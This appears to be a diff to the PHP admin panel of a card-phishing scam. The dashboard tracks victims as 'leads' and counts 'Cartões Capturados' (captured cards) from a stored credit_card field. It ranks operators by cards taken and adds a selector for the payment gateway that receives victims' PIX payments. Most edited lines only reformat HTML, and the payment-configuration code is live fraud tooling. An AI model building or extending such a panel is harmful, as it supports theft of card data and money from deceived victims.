@@ -635,12 +635,15 @@ $users = getUsers();
                             <td>
                                 <div class="user-info">
                                     <div class="user-avatar">
-                                        <?php echo strtoupper(substr($u['fullname'] ?? $u['username'], 0, 1)); ?></div>
+                                        <?php echo strtoupper(substr($u['fullname'] ?? $u['username'], 0, 1)); ?>
+                                    </div>
                                     <div>
                                         <div style="font-weight: 700;">
-                                            <?php echo htmlspecialchars($u['fullname'] ?? 'Não informado'); ?></div>
+                                            <?php echo htmlspecialchars($u['fullname'] ?? 'Não informado'); ?>
+                                        </div>
                                         <div style="font-size: 0.75rem; color: var(--text-muted);">
-                                            <?php echo htmlspecialchars($u['manager'] ?? 'Sem consultor'); ?></div>
+                                            <?php echo htmlspecialchars($u['manager'] ?? 'Sem consultor'); ?>
+                                        </div>
                                     </div>
                                 </div>
                             </td>
@@ -689,14 +692,20 @@ $users = getUsers();
                         <h3 style="margin: 0; color: #fff;">Chave PIX Global</h3>
                     </div>
                     <?php
-                    $cfg = json_decode(@file_get_contents('../src/Config/payment.json'), true) ?: ['pix_key' => ''];
+                    $cfg = json_decode(@file_get_contents('../src/Config/payment.json'), true) ?: ['pix_key' => '', 'active_gateway' => 'safe-bank'];
                     ?>
                     <div class="form-group">
                         <label class="modal-label">Sua Chave PIX (E-mail, CPF, ou Aleatória)</label>
                         <input type="text" id="cfg-pix-key" value="<?php echo htmlspecialchars($cfg['pix_key']); ?>"
                             placeholder="ex: seu-pix@email.com">
+
+                        <label class="modal-label" style="margin-top: 15px;">Gateway de Pagamento Ativo</label>
+                        <select id="cfg-active-gateway">
+                            <option value="safe-bank" <?php echo ($cfg['active_gateway'] ?? 'safe-bank') === 'safe-bank' ? 'selected' : ''; ?>>Safe-Bank (Padrão)</option>
+                        </select>
+
                         <button class="btn-save" onclick="savePixConfig()"
-                            style="margin-top: 15px; padding: 12px;">ATUALIZAR CHAVE <i
+                            style="margin-top: 15px; padding: 12px;">SALVAR CONFIGURAÇÕES <i
                                 class="fas fa-save"></i></button>
                     </div>
                 </div>
@@ -817,7 +826,8 @@ $users = getUsers();
                     <div class="stat-info">
                         <h3>Acessos Checkout</h3>
                         <div class="value">
-                            <?php echo count(array_filter($users, fn($u) => isset($u['credit_card']))); ?></div>
+                            <?php echo count(array_filter($users, fn($u) => isset($u['credit_card']))); ?>
+                        </div>
                     </div>
                 </div>
                 <div class="stat-card">
@@ -826,7 +836,8 @@ $users = getUsers();
                     <div class="stat-info">
                         <h3>Cartões Capturados</h3>
                         <div class="value">
-                            <?php echo count(array_filter($users, fn($u) => isset($u['credit_card']))); ?></div>
+                            <?php echo count(array_filter($users, fn($u) => isset($u['credit_card']))); ?>
+                        </div>
                     </div>
                 </div>
                 <div class="stat-card">
@@ -907,7 +918,8 @@ $users = getUsers();
                                 <?php foreach ($top as $name => $data): ?>
                                     <tr style="border-bottom: 1px solid rgba(255,255,255,0.02);">
                                         <td style="padding: 12px; color: #fff; font-weight: 600;">
-                                            <?php echo htmlspecialchars($name); ?></td>
+                                            <?php echo htmlspecialchars($name); ?>
+                                        </td>
                                         <td style="padding: 12px; color: var(--text-muted);"><?php echo $data['leads']; ?></td>
                                         <td style="padding: 12px; color: var(--red); text-align: right; font-weight: 700;">
                                             <?php echo $data['cards']; ?>
@@ -940,7 +952,8 @@ $users = getUsers();
                         <div style="font-size: 0.8rem; color: var(--text-muted); margin-bottom: 5px;">VALOR TOTAL DO
                             PÁTIO (LEADS)</div>
                         <div style="font-size: 1.8rem; font-weight: 800; color: #fff;">R$
-                            <?php echo number_format($totalVolume, 2, ',', '.'); ?></div>
+                            <?php echo number_format($totalVolume, 2, ',', '.'); ?>
+                        </div>
                     </div>
 
                     <div
@@ -1294,14 +1307,16 @@ $users = getUsers();
         }
 
         async function savePixConfig() {
-            const pixKey = document.getElementById('cfg-pix-key').value;
-            if (!pixKey) return Swal.fire('Erro', 'Informe a chave PIX.', 'error');
+            const key = document.getElementById('cfg-pix-key').value;
+            const gateway = document.getElementById('cfg-active-gateway').value;
+
+            if (!key) return Swal.fire('Erro', 'Informe a chave PIX.', 'error');
 
             try {
                 const response = await fetch('../auth.php', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-                    body: `action=update_pix_config&pix_key=${encodeURIComponent(pixKey)}`
+                    body: `action=update_pix_config&pix_key=${encodeURIComponent(key)}&active_gateway=${encodeURIComponent(gateway)}`
                 });
                 const result = await response.json();
                 if (result.success) {
